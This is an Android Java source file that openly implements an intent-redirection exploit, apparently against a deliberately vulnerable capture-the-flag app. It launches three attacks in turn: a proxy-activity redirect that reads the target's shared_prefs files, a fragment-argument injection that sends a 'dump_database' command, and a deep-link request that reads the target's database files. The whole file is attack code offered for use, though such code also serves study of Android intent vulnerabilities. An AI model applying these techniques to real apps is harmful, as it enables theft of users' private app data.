package com.example.intentredirector;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.os.Bundle;

public class ExploitActivity extends Activity {

    private static final String TARGET = "com.example.intetn_redirect_vuln";
    private static final String PROXY_CLASS = TARGET + ".Proxy_Activity";
    private static final String MAIN_CLASS = TARGET + ".MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new Handler().postDelayed(() -> {
            attemptProxyExploit();
            attemptMainActivityInjection();
            attemptWebViewLeak();
            finish();
        }, 500);
    }

    private void attemptProxyExploit() {
        try {
            Intent i = new Intent()
                    .setClassName(TARGET, PROXY_CLASS)
                    .putExtra("url", "file:///data/data/" + TARGET + "/shared_prefs/*.xml")
                    .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

            startActivity(i);
        } catch (Exception e) {
            Log.e("EXPLOIT", "Proxy attack failed: " + e.getMessage());
        }
    }

    private void attemptMainActivityInjection() {
        try {
            Bundle args = new Bundle();
            args.putString("command", "dump_database");

            Intent i = new Intent()
                    .setClassName(TARGET, MAIN_CLASS)
                    .putExtra(":android:show_fragment_args", args);

            startActivity(i);
        } catch (Exception e) {
            Log.e("EXPLOIT", "MainActivity attack failed", e);
        }
    }

    private void attemptWebViewLeak() {
        try {
            startActivity(new Intent(Intent.ACTION_VIEW)
                    .setData(Uri.parse("k0k0://flag?action=read&file=/data/data/" + TARGET + "/databases/*.db"))
                    .setPackage(TARGET));
        } catch (Exception e) {
            Log.e("EXPLOIT", "Deep link attack failed", e);
        }
    }
}